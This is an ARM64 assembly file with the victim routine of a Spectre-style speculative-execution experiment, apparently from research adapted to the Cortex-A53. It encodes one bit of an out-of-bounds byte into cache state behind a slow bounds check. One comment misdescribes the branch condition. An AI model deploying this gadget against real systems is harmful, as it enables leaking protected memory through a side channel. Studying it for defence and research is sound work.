.globl victimCode
.text
.type    victimCode,%function
victimCode:
	/* &array1_size goes into X0
	   array1 	goes into X1
	   array2 	goes into X2
	   m	 	goes into X3 ---> to choose the bit to read in the retrieved byte
	   x 		goes into X4 ---> standard 'apcs-gnu' not 'aapcs'
	*/
	// Save X4,X5 and X6 contents before using them (we don't know which registers are being used by the c code)
	STR X4,[SP,#-8]	// Store X4 content into the location pointed by SP
	STR X5,[SP,#-16]
	STR X6,[SP,#-24]
  	STR X7,[SP,#-32]
	MOV X5,#0	// Move (load) 0 into X5
	MOV X6,#50
  	MOV X7,#1
  	LSL X7, X7, X3
	// Cortex-a53 cannot use the result of a speculative instruction in another operation
	// Value at array1+x is preloaded in order not to be executed speculatively like in the original Spectre attack
	// In order to do so we have to be sure the access to array1+x (in case x is out of bound)
	// does not trigger an exception (this could be true if we access a region still in the user space)
	LDRB W1,[X1,X4] // W1=*(array1+x)
	AND X1, X1, X7 	// To leave only a bit in X1
	LSR X1, X1, X3
	LSL X1, X1, #12 //we have to access the 64th line of cache in case of a 1!
	DSB ISH			// ---> Execution Barrier
	ISB
	LDR X5,[X0] 	//array_size is not in cache, long instruction

	CMP X4,X5
	BHS wrong_x 	// If(x<array_size) jump to wrong_x --> this is the branch whose misprediction we have to train
	LDRB W2,[X2,X1]	// Load into X2 the content at array2+[(array1+x)*LINE_DISTANCE]

  wrong_x:
	LDR X7,[SP,#-32]
	LDR X6,[SP,#-24]
	LDR X5,[SP,#-16]
	LDR X4,[SP,#-8]
	RET
